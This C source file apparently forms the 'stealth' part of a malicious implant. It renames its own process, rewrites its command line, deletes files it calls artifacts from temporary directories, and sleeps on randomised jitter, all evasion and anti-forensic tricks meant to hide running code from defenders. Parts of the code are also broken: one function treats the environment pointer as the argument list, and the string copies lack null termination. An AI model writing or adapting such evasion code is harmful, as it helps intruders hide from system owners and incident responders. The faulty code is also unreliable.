#include "stealth.h"
#include <time.h>
#include <unistd.h> // For sleep or usleep
// extern time_t time(time_t *t); // Trying to fix time.h by explicit declaration


extern char **environ;
void rename_process(const char *new_name) {
#ifdef __linux__
    extern char *program_invocation_short_name;
    extern char *program_invocation_name;
    strncpy(program_invocation_short_name, new_name, strlen(new_name));
    strncpy(program_invocation_name, new_name, strlen(new_name));
#elif __APPLE__
    // macOS equivalent using setproctitle
    extern int setproctitle(const char *);
    setproctitle(new_name);
#else
    printf("Rename process not supported on this platform.\n");
#endif
    printf("Process renamed to: %s\n", new_name);
}

void change_cmdline(const char *new_cmdline) {
#ifdef __linux__
    extern char **environ;
    char **argv = *(char ***)environ;
    strncpy(argv[0], new_cmdline, strlen(new_cmdline));
    argv[1] = NULL; // Terminate the argument list
#else
    printf("Change cmdline not supported on this platform.\n");
#endif
    printf("Command-line arguments updated.\n");
}

void clean_artifacts() {
    const char *temp_files[] = {"/tmp/file1", "/var/tmp/file2", NULL};
    for (int i = 0; temp_files[i] != NULL; i++) {
        if (unlink(temp_files[i]) == 0) {
            printf("Removed artifact: %s\n", temp_files[i]);
        } else {
            perror("Error removing artifact");
        }
    }
}

void dynamic_sleep(int base_time, int jitter) {
    srand(time(NULL));
    int sleep_time = base_time + (rand() % jitter);
    printf("Sleeping for %d seconds...\n", sleep_time);
    sleep(sleep_time);
}